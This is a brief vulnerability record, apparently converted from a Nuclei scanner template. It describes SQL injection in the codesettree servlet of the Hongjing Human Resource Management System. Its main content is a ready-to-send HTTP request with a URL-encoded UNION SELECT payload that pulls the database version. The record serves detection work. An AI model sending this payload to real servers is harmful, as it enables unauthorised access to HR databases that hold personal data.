# Vulnerability: Hongjing Human Resource Management System - SQL Injection
**Classification:** CNVD2023
**Source:** Nuclei Template (`CNVD-2023-08743.yaml`)

## Description
There is a SQL injection vulnerability in the categories of Hongjing Human Resource Management System, from which attackers can obtain sensitive database information.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d HTTP/1.1
Host: {{Hostname}}
```
